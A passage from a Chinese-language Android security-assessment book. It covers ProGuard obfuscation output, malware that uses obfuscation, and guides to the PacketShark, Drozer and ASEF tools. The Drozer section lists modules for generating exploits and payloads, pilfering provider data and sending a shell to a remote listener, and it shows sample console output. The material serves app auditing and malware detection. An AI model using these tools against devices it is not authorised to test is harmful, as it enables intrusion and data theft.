Class.com.google.vending.licensing.licensing Service</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>com.google.vending.licensing.ILicensingService</td><td style='text-align: center; word-wrap: break-word;'>ILicensingService</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-keep public class</td><td style='text-align: center; word-wrap: break-word;'>该选项不更改Public Class.com.android.vending.licensing.licensing Service</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>com.android.vending.licensing.ILicensingService</td><td style='text-align: center; word-wrap: break-word;'>ILicensingService</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-keepclasseswithmembernames</td><td style='text-align: center; word-wrap: break-word;'>与.so文件的NDK、JNI等连接的类不加密时，使用该选项进行设置。可能会有本地方法被ProGuard加密或被优化而出现错误（删除不使用的方法引发的错误），需要特别注意。如果使用NDK、JNI，需适当使用下面的选项</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>class * { native &lt;methods&gt;; }</td><td style='text-align: center; word-wrap: break-word;'>该选项防止更改setters、getters，以保证动画在View中持续运行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-keepclassmembers public class * extends android.view.View { void set*(***); *** get(); }</td><td style='text-align: center; word-wrap: break-word;'>该选项防止修改Activity中的方法</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-keepclassmembers class * extends android.app.Activity { public void *(android.view.View); }</td><td style='text-align: center; word-wrap: break-word;'>该选项维持枚举类的设置</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-keepclassmembers enum * { public static **[] values(); public static ** valueOf(java.lang.String); }</td><td style='text-align: center; word-wrap: break-word;'>该选项维持以R结尾的类成员</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-keepclassmembers class **.RS* { public static &lt;fields&gt;; }</td><td style='text-align: center; word-wrap: break-word;'>该选项能够防止加密第三方库或jar等库文件时出现错误</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-dontwarn android.support.** -dontwarn 文件名.**</td><td style='text-align: center; word-wrap: break-word;'>该选项能够防止加密第三方库或jar等库文件时出现错误</td></tr></table>

#### 5.11.4 ProGuard生成文件简介

如果成功使用ProGuard进行了加密，项目目录中就会成为ProGuard的文件夹，该文件夹内会生成daum.txt、mapping.txt、seeds.txt、usage.txt文件。这些文件有如下功能。

# 1. dump.txt

此文件会记录与被加密apk文件链接的所有类的结构分析结果。

 </div>

# 2. usage.txt

此文件会记录已删除的未使用方法，如图5-77所示。

 </div>

由图5-77可以看到, TestClassA.java类中定义了public static void TestAB方法, 但图5-78的MainActivity类和图5-80的TestClassB类都没有用到它, 所以记录了未使用的类被删除。

 </div>

 </div>

 </div>

类或方法之前的3:3等数字是行号。如果想删除不使用的类或方法，需要激活ProGuard优化选项。

或把proguard.config文件链接到proguard.config=${sdk.dir}/tools/proguard/proguard-android-optimize.txt。

void setSize(java.lang.Object,int,int) -> a
boolean isFinished(java.lang.Object) -> a
void finish(java.lang.Object) -> b
boolean onPull(java.lang.Object,float) -> a
boolean onRelease(java.lang.Object) -> c
boolean draw(java.lang.Object,android.graphics.Canvas) -> a
android.support.v4.widget.EdgeEffectCompatible -> android.support.v4.d.e:
void setSize(java.lang.Object,int,int) -> a
boolean isFinished(java.lang.Object) -> a
void finish(java.lang.Object) -> b
boolean onPull(java.lang.Object,float) -> a
boolean onRelease(java.lang.Object) -> c
boolean draw(java.lang.Object,android.graphics.Canvas) -> a
com.namdaehyeon.helloworld.MainActivity -> com.namdaehyeon.helloworld.MainActivity:
void onCreate(android.os.Bundle) -> onCreate
boolean onCreateOptionsMenu(android.view.Menu) -> onCreateOptionsMenu
com.namdaehyeon.helloworld.TestClassA -> com.namdaehyeon.helloworld.a:
void TestAA() -> a
com.namdaehyeon.helloworld.TestClassB -> com.namdaehyeon.helloworld.b:
void TestBA() -> a

 </div>

mapping.txt文件记录了加密前后的类、方法、字段信息等的变化，如图5-81所示。如果想解决应用ProGuard后出现的错误，就需要分析mapping.txt文件。使用Stack Trace等进行分析时，也需要mapping.txt文件。

# 3. seeds.txt

如图5-82所示，此文件记录了未加密的类、方法、字段信息。

 </div>

#### 5.11.5 ProGuard的结果文件

使用dex2jar将之前生成的HelloWorld.apk的dex文件转换为jar文件，并使用JD-GUI浏览，如图5-83所示。

将图5-83与mapping.txt进行比较后能看到，TestClassA换为a，TestClassB方法也有改动。即使使用ProGuard也未能转换MainActivity类，这样，Android系统启动App生成Activity的过程

中会查找App的Activity类，如果此时更改MainActivity类名而导致Android系统无法查找到，就会出现错误。

 </div>

Android系统下的Activity是使App和用户之间相互作用的大段代码，例如在画面显示UI等可视化内容或提供某些服务。App运行时，第一个启动的就是MainActivity。正因如此，不可以对包括MainActivity在内的一部分类、方法、变量等进行加密。

Dexguard（商业版ProGuard）包括字符串加密、类加密、Asset文件加密、隐藏重要API、入侵测试、删除Android日志等功能。对于免费版无法保护的部分，可以考虑使用商业版保护。

 </div>

诊断手机App时，不同程序类型需要诊断的项目也不同。但保护服务资产是其中最重要的部分，所以“源代码加密”从PC环境下的Java源代码开始就是热点话题。虽然我们推荐各位在Android移动App中应用多种安全功能，比如通过比较服务器和散列值探测被修改的App、探查是否使用反向技术、利用垃圾代码妨碍逆向分析等，但由于Java程序的反编译特性，如果不首先对源代码进行加密，那么应对其他项目时就会遇到困难。因此，需要充分审核源代码加密软件，也要考虑在当前环境下适用相关方案会否出现问题。

#### ☐ 恶意App也开始使用源代码加密

http://www.kbench.com/digital/?no=119763&sc=1

发现Android史上最先进的恶意代码 “Obad”。

Android恶意代码也在不断进化。2013年初，因为用户会定期使用USB端口连接PC和Android设备，所以使用USB连接PC时，apk文件会随着autorun.inf文件自动运行，从而传播病毒。

http://www.etnews.com/news/international/2752211_1496.html

2013年6月出现了包含多种功能、可获取所有系统权限的恶意代码。当然，带有这种功能的恶意代码无论以任何方式都能运转。此处需要注意的是“代码加密”，针对PC客户端的恶意代码也开始对自身进行保护。软件公司为了保护自身产品而使用的反调试技术已开始应用于恶意代码的开发，对恶意代码适用各种打包方式以干扰分析。

手机恶意代码也开始使用加密技术，像蠕虫病毒一样在手机之间传播，或感染PC进行二次攻击。我们需要深入考虑，究竟应当如何应对每天新出现的几十万恶意代码。

### 5.12 小结

本章通过对测试程序的诊断，讲解了渗透测试过程中用到的Android App服务诊断方法。Android App漏洞诊断已经成为所有客户公司一定会要求的项目。随着App的功能越来越多，针对手机App的漏洞诊断也越来越复杂，一点也不亚于针对Web服务器的漏洞诊断，这也需要我们对诊断对象的功能有更深入的了解。虽然本章内容未能涵盖所有诊断方法，但希望各位充分了解并在实际工作中进行参考。第6章将介绍其他诊断工具。

### 第6章

# 使用 Android 诊断工具

本章将介绍诊断移动服务时可以使用的工具，用于分析网络数据包、移动取证、诊断漏洞。本书不可能涵盖所有内容，只介绍几款常用的代表性工具。

### 6.1 PacketShark：网络数据包截获工具

网络数据包截获可以保存设备发送的所有数据包信息，可以在没有无线AP环境时用作备选项。在Google Play Store搜索“PacketShark”并安装。

下面讲解可以在Android环境下截获数据包的App——PacketShark。PacketShark利用可以在Android环境下使用的tcpdump为基础开发而成，其特点如下：

☐ 可以选择网络接口；

☐ 可对截获的数据包进行过滤（TCP、UDP、ICMP、SYN、SYN-ACK、ACK、FIN、RST、PSH-ACK、Web等）；

☐ 可以把截获的数据包上传至Dropbox；

☐ 可实时查看截获的数据包。

可以从Google Play Store下载PacketShark，安装完成后会出现如图6-1所示的图标。

 </div>

点击PacketShark图标出现如图6-2所示画面。

 </div>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Interface</td><td style='text-align: center; word-wrap: break-word;'>显示已激活的网络接口，选择需截获的接口即可</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Filter</td><td style='text-align: center; word-wrap: break-word;'>截获数据包时可过滤截获自己需要的数据。Filter选项提供所有tcpdump支持的Filter功能</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Vervose Output</td><td style='text-align: center; word-wrap: break-word;'>可以设置数据包信息的具体显示度，与tcpdump的v/ -vv/ -vvv选项相同</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Data Output</td><td style='text-align: center; word-wrap: break-word;'>使用Hex/ASCII之一显示数据包，与tcpdump的-x/ -X选项相同</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Resolve Hosts</td><td style='text-align: center; word-wrap: break-word;'>选择是否将截获数据包的地址（主机地址/端口号）更改为主机名，与tcpdump的-n选项相同</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Print Timestamp</td><td style='text-align: center; word-wrap: break-word;'>可以控制是否显示输出行的时间戳，与tcpdump的-t选项相同</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Packet Byte Limit</td><td style='text-align: center; word-wrap: break-word;'>将从数据包提取的样本设置为默认值68字节以外的值，与tcpdump的-s选项相同</td></tr></table>

用户选择需要的选项后，点击顶端的▷就会开始截取数据包，如图6-3所示。

 </div>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Sniffer Status</td><td style='text-align: center; word-wrap: break-word;'>显示数据包嗅探器的状态（STOPPED/RUNNING）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Packets Captured</td><td style='text-align: center; word-wrap: break-word;'>显示截获数据包的数量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Viewable Packets</td><td style='text-align: center; word-wrap: break-word;'>显示肉眼可以确认的数据包数量（可以在顶端的PACKETVIEW查看）</td></tr></table>

可以通过PACKETVIEW 查看正在截获数据包的状态，如图6-4所示。

 </div>

要想停止截获数据包，可以点击顶端的☐按钮。在此状态下直接关闭PacketShark则不会保存数据包，如果想保存数据包，需要点击Android设备菜单键以激活菜单，如图6-5所示。

 </div>

打开菜单后，点击Save才能保存数据包。点击Save菜单出现数据包名称设置窗口，在此设置文件名即可,也可以使用默认提供的文件名称。选择Dropbox Upload就可以把文件上传到DropBox。

 </div>

数据包文件的保存位置是/storage/sdcard0/Capture。使用USB线连接Android设备和电脑即可看到Capture目录。可以使用WireShark等工具分析截获的文件。

### 6.2 Drozer：移动诊断框架

Drozer是在知名移动服务诊断框架Mercury的基础上添加功能后发布的全新框架。包括Santoku Live CD在内的某些手机诊断工具虽然还包含Mecury，但此款工具已不再更新升级。

通过访问Android设备的系统，Drozer可以轻松地对App进行详细诊断。Windows或Linux系统中如果安装了JRE（Java Runtime Environment）、JDK（Java Development Kit）或Android SDK，就可以使用C/S模式运行此工具。

Drozer有共享版和专业版，专业版可以使用图形模式自动分析App。

 </div>

本书将使用免费共享版。可以从如下网站下载安装文件、服务器文件和说明书。https://www.mwrinfosecurity.com/products/drozer/community-edition/

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>程 序</td><td style='text-align: center; word-wrap: break-word;'>散列信息（MD5）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>drozer(Windows Installer)</td><td style='text-align: center; word-wrap: break-word;'>6ea4beb229e8a074bf54b8408dc47217</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>drozer(Debian/Ubuntu Archive)</td><td style='text-align: center; word-wrap: break-word;'>11858519a69ade4cda3fde2b9fd22dea</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>drozer(RPM)</td><td style='text-align: center; word-wrap: break-word;'>3c7c2b4953394db54562a1c43fce91e0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>drozer(Python .egg)</td><td style='text-align: center; word-wrap: break-word;'>27f0f3d90c6fe8b402cb31750b111f52</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>drozer(Agent .apk Only)</td><td style='text-align: center; word-wrap: break-word;'>3ce3b0e673d7a199186e8568fcabaab2</td></tr></table>

解压下载的drozer-installer压缩文件后，可以看到安装文件setup.exe和agent.apk文件，如图6-8所示。setup.exe是安装在用于诊断的PC（本地电脑）上的命令行可执行文件，agent.apk文件安装

到移动设备后用作服务器。用于诊断的PC和用作服务器的设备处于连接状态。

 </div>

用USB线连接设备后，使用adb shell命令将agent.apk文件安装到设备。

C:\drozer-installer-2.3.3>adb install agent.apk
* daemon not running. starting it now on port 5037 *
* daemon started successfully *
6277 KB/s (629950 bytes in 0.098s)
pkg: /data/local/tmp/agent.apk
Success

如果正常安装则会看到 “drozer Agent” 图标，如图6-9所示，点击此按钮就能看到程序在运行（右）。

 </div>

在运行程序的下方可以看到Embedded Server是“不使用”状态,点击此按钮就会变为“使用”。

之后运行压缩文件内的setup.exe文件进行安装，默认安装到C:\drozer文件夹，如图6-9所示。此处的drozer.bat文件是可以在Windows环境下运行的命令行程序。

 </div>

运行drozer.bat文件后，如果可以看到下面的使用方法，就说明运行正常。

C:\\drozer&gt;drozer.bat
usage: drozer [COMMAND]
Run `drozer [COMMAND] --help` for more usage information
Commands:
console start the drozer Console
module manage drozer modules
server start a drozer Server
ssl manage drozer SSL key material
exploit generate an exploit to deploy drozer
agent create custom drozer Agents
payload generate payloads to deploy drozer

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>主要选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>console</td><td style='text-align: center; word-wrap: break-word;'>运行Drozer命令行窗口</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>module</td><td style='text-align: center; word-wrap: break-word;'>管理Drozer组件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Server</td><td style='text-align: center; word-wrap: break-word;'>运行Drozer服务器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ssl</td><td style='text-align: center; word-wrap: break-word;'>管理Drozer SSL密钥</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>exploit</td><td style='text-align: center; word-wrap: break-word;'>制作可以在Drozer中使用的攻击代码（exploit）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>agent</td><td style='text-align: center; word-wrap: break-word;'>生成用户定义的Drozer服务器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>payload</td><td style='text-align: center; word-wrap: break-word;'>生成可以在Drozer中使用的Payload</td></tr></table>

连接设备前需要设置服务器IP和端口。使用adb命令的forward选项使端口保持一致。

* daemon started successfully *

之后使用drozer.bat文件的命令选项connect与设备进行连接。

C:\drozer&gt;drozer.bat console connect

 </div>

连接后输入list命令。list命令可以列出所有可以在Drozer中使用的命令，都是可以控制设备的功能。

Skipping source file at __init__. . Unable to load Python module.
app.activity.forintent Find activities that can handle the given intent
app.activity.info Gets information about exported activities.
app.activity.start Start an Activity
app.broadcast.info Get information about broadcast receivers
app.broadcast.send Send broadcast using an intent
app.package.attacksurface Get attack surface of package
app.package.debuggable Find debuggable packages
...(中略)...

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.activity.forintent</td><td style='text-align: center; word-wrap: break-word;'>查询可处理Intent的Activity</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.activity.info</td><td style='text-align: center; word-wrap: break-word;'>获取导入的Activity信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.activity.start</td><td style='text-align: center; word-wrap: break-word;'>开始Activity</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.broadcast.info</td><td style='text-align: center; word-wrap: break-word;'>获取BroadcastReceiver信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.broadcast.send</td><td style='text-align: center; word-wrap: break-word;'>向正在使用的Intent发送广播</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.package.attacksurface</td><td style='text-align: center; word-wrap: break-word;'>获取Package的攻击表面</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.package.debuggable</td><td style='text-align: center; word-wrap: break-word;'>查找可调试的Package</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.package.info</td><td style='text-align: center; word-wrap: break-word;'>获取已安装的Package信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.package.launchintent</td><td style='text-align: center; word-wrap: break-word;'>访问Package的Intent</td></tr></table>

(续)

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.package.list</td><td style='text-align: center; word-wrap: break-word;'>Package列表</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.package.manifest</td><td style='text-align: center; word-wrap: break-word;'>获取Package的AndroidManifest.xml</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.package.shareduid</td><td style='text-align: center; word-wrap: break-word;'>与共享的UID一同查看Package</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.provider.columns</td><td style='text-align: center; word-wrap: break-word;'>内容提供者列表栏</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.provider.delete</td><td style='text-align: center; word-wrap: break-word;'>删除内容提供者</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.provider.download</td><td style='text-align: center; word-wrap: break-word;'>从支持文件的内容提供者处下载文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.provider.finduri</td><td style='text-align: center; word-wrap: break-word;'>查询Package中浏览的内容URI</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.provider.info</td><td style='text-align: center; word-wrap: break-word;'>获取正在调用的内容提供者信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.provider.insert</td><td style='text-align: center; word-wrap: break-word;'>插入内容提供者</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.provider.query</td><td style='text-align: center; word-wrap: break-word;'>调用内容提供者查询</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.provider.read</td><td style='text-align: center; word-wrap: break-word;'>读取支持文件的内容提供者</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.provider.update</td><td style='text-align: center; word-wrap: break-word;'>升级内容提供者中包含的记录</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.service.info</td><td style='text-align: center; word-wrap: break-word;'>获取外部服务信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.service.start</td><td style='text-align: center; word-wrap: break-word;'>开始服务</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>app.service.stop</td><td style='text-align: center; word-wrap: break-word;'>停止服务</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>auxiliary.webcontentresolver</td><td style='text-align: center; word-wrap: break-word;'>开始内容提供者的Web服务界面</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>exploit.pilfer.general.apnprovider</td><td style='text-align: center; word-wrap: break-word;'>读取APN内容提供者</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>exploit.pilfer.general.settingsprovider</td><td style='text-align: center; word-wrap: break-word;'>读取内容提供者设置</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>information.datetime</td><td style='text-align: center; word-wrap: break-word;'>显示Date/Time</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>information.deviceinfo</td><td style='text-align: center; word-wrap: break-word;'>查看设备详细信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>information.permissions</td><td style='text-align: center; word-wrap: break-word;'>显示所有软件包正在使用的权限</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>scanner.misc.native</td><td style='text-align: center; word-wrap: break-word;'>搜索软件包中的本地组件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>scanner.misc.readablefiles</td><td style='text-align: center; word-wrap: break-word;'>搜索可读取文件夹内的文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>scanner.misc.secretcodes</td><td style='text-align: center; word-wrap: break-word;'>搜索可用于拨号的安全代码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>scanner.misc.sflagbinaries</td><td style='text-align: center; word-wrap: break-word;'>搜索/系统目录下的suid/sgid二进制文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>scanner.misc.writablefiles</td><td style='text-align: center; word-wrap: break-word;'>搜索可写文件夹内的文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>scanner.provider.finduris</td><td style='text-align: center; word-wrap: break-word;'>查找可以通过上下文进行查询的内容提供者</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>scanner.provider.injection</td><td style='text-align: center; word-wrap: break-word;'>检查是否有用于SQL注入漏洞的测试攻击者</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>scanner.provider.traversal</td><td style='text-align: center; word-wrap: break-word;'>检查是否存在遍历文件的漏洞</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>shell.exec</td><td style='text-align: center; word-wrap: break-word;'>执行Linux shell</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>shell.send</td><td style='text-align: center; word-wrap: break-word;'>向远程监听者发送ASH shell</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>shell.start</td><td style='text-align: center; word-wrap: break-word;'>输入交互式Linux shell</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>tools.file.download</td><td style='text-align: center; word-wrap: break-word;'>下载文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>tools.file.md5sum</td><td style='text-align: center; word-wrap: break-word;'>获取文件的md5校验和</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>tools.file.size</td><td style='text-align: center; word-wrap: break-word;'>获取文件大小</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>tools.file.upload</td><td style='text-align: center; word-wrap: break-word;'>上传文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>tools.setup.busybox</td><td style='text-align: center; word-wrap: break-word;'>安装Busybox</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>tools.setup.su</td><td style='text-align: center; word-wrap: break-word;'>准备在设备中安装su程序</td></tr></table>

执行run app.package.list命令查看正在运行的软件包，可以看到，与第2章介绍的pm命令非常类似。

mercury> run app.package.list
com.google.android.location
com.sec.android.app.camerafirmware
android.game
com.revenssis
com.sec.android.app.phoneutil
com.sec.android.KTNetwork
com.sec.android.app.unifiedinbox
com.monotype.android.font.tinkerbell
com.android.defcontainer
com.sec.android.app.snsaccount
com.android.contacts
com.android.phone
com.kt.android.show.ntq
org.connectbot
de.trier.infsec.koch.droidsheep
com.android.htmlviewer
com.android.bluetooth
com.android.providers.calendar
com.virustotal
com.samsung.android.app.divx
com.android.calendar
com.android.browser
com.android.music
com.sec.android.provider.badge

 $ \ldots $ (省略)  $ \ldots $

可以使用help命令查看各命令的详细使用方法。

dz> help app.package.list
usage: run app.package.list [-h] [-d DEFINES_PERMISSION] [-f FILTER] [-g GID]
[-p PERMISSION] [-u UID] [-n]

List all installed packages on the device. Specify optional keywords to search for in the package name.

Examples:
Finding all packages with the keyword "browser" in their name:
dz> run app.package.list -f browser
com.android.browser

Last Modified: 2012-11-06
Credit: MWR InfoSecurity (@mwrlabs)
License: BSD (3 clause)

optional arguments:
-h, --help

-d DEFINES_PERMISSION, --defines-permission DEFINES_PERMISSION
    filter by the permissions a package defines
-f FILTER, --filter FILTER
    keyword filter conditions
-g GID, --gid GID    filter packages by GID
-p PERMISSION, --permission PERMISSION
    permission filter conditions
-u UID, --uid UID    filter packages by UID
-n, --no_app_name    do not print the app name

如果想使用drozer支持的模块检查Google App服务信息, 可以使用app.package.info查看目录信息、apk文件信息、库、UID信息、权限等内容。

权限信息也得到整理显示，可以迅速判断恶意代码或App程序内不必要的权限信息。

dz> run app.package.info -a com.android.email
Package: com.android.email
Application Label: System
Process Name: com.android.email
Version: 2.3.6
Data Directory: /data/data/com.android.email
APK Path: /system/app/Email.apk
UID: 10019
GID: [3003, 1015, 1001]
Shared Libraries: [/system/framework/twframework.jar,
/system/framework/sechardware.jar]
Shared User ID: null
Uses Permissions:
- android.permission.RECEIVE_BOOT_COMPLETED
- com.sec.android.provider.badge.permission.WRITE
- com.sec.android.provider.badge.permission.READ
- android.permission.READ_CONTACTS
- android.permission.READ_TASKS
- android.permission.WRITE_TASKS
- android.permission.READ_OWNER_DATA
- android.permission.ACCESS_NETWORK_STATE
- android.permission.INTERNET
- android.permission.VIBRATE
- android.permission.WRITE_EXTERNAL_STORAGE
- android.permission.GET_ACCOUNTS
- android.permission.MANAGE_ACCOUNTS
- android.permission.AUTHENTICATE_ACCOUNTS
- android.permission.READ_SYNC_SETTINGS
- android.permission.WRITE_SYNC_SETTINGS

使用-p选项按用户权限进行搜索。下面是搜索包含网络状态信息权限的App示例，也可用于搜索设备中包含可能恶意使用权限的App。

dz> run app.package.info -p android.permission.ACCESS_NETWORK_STATE
Package: Iconon.App.OnNews
Application Label: Iconon.App.OnNews
Process Name: Iconon.App.OnNews
Version: 1.5

Data Directory: /data/data/Iconon.App.OnNews
APK Path: /system/app/OnNews.apk
UID: 10093
GID: [3003, 1015]
Shared Libraries: [/system/framework/com.samsung.device.jar]
Shared User ID: null
Uses Permissions:
- android.permission.INTERNET
- android.permission.WRITE_EXTERNAL_STORAGE
- android.permission.ACCESS_NETWORK_STATE
- android.permission.ACCESS_WIFI_STATE
- android.permission.READ_PHONE_STATE
Defines Permissions:
- None
...（中略）...
Package: android
Application Label: System
Process Name: system
Version: 2.3.6
Data Directory: /data/system
APK Path: /system/framework/framework-res.apk
UID: 1000
GID: [3001, 1006, 1001, 3002, 1015, 3003, 2001, 1004, 2002, 1007]
Shared Libraries: null
Shared User ID: android.uid.system
Uses Permissions:
- android.intent.category.MASTER_CLEAR.permission.C2D_MESSAGE
Defines Permissions:
- android.permission.sec.MDM_APP_MGMT
- android.permission.sec.MDM_BLUETOOTH
- android.permission.ACCESS_MOCK_LOCATION
- android.permission.ACCESS_LOCATION_EXTRA_COMMANDS
- android.permission.INSTALL_LOCATION_PROVIDER
- android.permission.INTERNET
- android.permission.ACCESS_NETWORK_STATE
- android.permission.ACCESS_WIFI_STATE
- android.permission.ACCESS_WIMAX_STATE

 $ \ldots $ (省略)  $ \ldots $

app.provier.finduri是在设备中查找provider路径的命令，通过查看下载路径检查是否为特定文件或是否已下载。

dz> run app.provider.finduri com.android.providers.downloads
Scanning com.android.providers.downloads...
content://downloads
content://downloads/download
content://downloads/download/
content://downloads/
content://downloads/my_downloads
content://downloads/my_downloads/

获取各软件包的Activity也很重要，因为Lock、Encrypt等可疑动作可以判断恶意代码或不必要的行为。例如，对用户的重要文件进行加密并诈骗财物的Ransomware也出现了Android版本。

http://thehackernews.com/2014/05/police-ransomware-malware-targeting.html

使用LogCat查看App运作过程时，可以看到LockActivity会定时工作。安装了诈骗App的设备将无法执行任何操作，只能看到不法分子设置的锁定后的画面。

 </div>

通过下列命令查看App的Activity。

本节讲解了可以在设备中使用的几个命令。Drozer是为了诊断Android平台和App漏洞而开发的，但使用之前介绍的内容则完全可以被用作恶意代码。在学术会议上演示恶意代码时，利用此

功能也是一个很不错的选择。

可参考下列URL。

http://labs.mwrinfosecurity.com/tools/2012/03/16/mercury/

☐ http://www.youtube.com/watch?v=d06SGkip2EA

### 6.3 ASEF：移动设备漏洞工具

本节将介绍2012年BlackHat大会上发布的ASEF（Android Security Evaluation Framework） $ ^{①} $。ASEF安全框架用于分析、监视安装在设备中的App，并判断是否运行恶意功能。ASEF会分如下3个阶段进行分析。

□ Passive 阶段：进入诊断前收集各种信息。

□ Active阶段：检查正在运行的App，阶段性收集信息。

☐ Interpret阶段：检测所有数据及其引发的结果。

 </div>

ASEF可以在本地PC上查看设备发生的所有阶段，还可以通过C&C（Command and Control）查看软件包信息、权限信息、网络数据包信息、使用Google safe browsing API的搜索、搜索之前收集到的恶意代码等多种信息。通过这些信息可以快速应对设备中安装的App引起的安全问题。

更详细的信息请查看样本视频 $ ^{②} $。

 </div>

#### 6.3.1 通过安装apk文件进行检测

如图6-16所示，编译下载的源代码，然后安装到AVD（Android Virtual Device）进行查看。可以快速查看用户安装的App和系统自带程序的权限信息。这种检测方法可以用于搜索设备中安装的诸多App，从中找出恶意程序或判断程序是否在使用多余的API权限。

 </div>

 </div>

##### ☐ 现有项目编译方法

下载源代码后能看到“NightPhoenix_ASEF”目录。在bin目录可以找到编译后的apk文件，如果想直接把此文件安装到设备，则可能出现错误。这是编译环境不同造成的问题。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>名称</td><td style='text-align: center; word-wrap: break-word;'>修改日期</td><td style='text-align: center; word-wrap: break-word;'>类型</td><td style='text-align: center; word-wrap: break-word;'>大小</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>bin</td><td style='text-align: center; word-wrap: break-word;'>2014/11/25 12:53</td><td style='text-align: center; word-wrap: break-word;'>文件夹</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DLLs</td><td style='text-align: center; word-wrap: break-word;'>2014/11/25 12:53</td><td style='text-align: center; word-wrap: break-word;'>文件夹</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>AndroidManifest.xml</td><td style='text-align: center; word-wrap: break-word;'>2014/11/25 12:47</td><td style='text-align: center; word-wrap: break-word;'>XML 文档</td><td style='text-align: center; word-wrap: break-word;'>1KB</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>classes.dex</td><td style='text-align: center; word-wrap: break-word;'>2014/11/25 12:47</td><td style='text-align: center; word-wrap: break-word;'>DEX 文件</td><td style='text-align: center; word-wrap: break-word;'>10KB</td></tr><tr><td style='text-align: center; word-wrap: 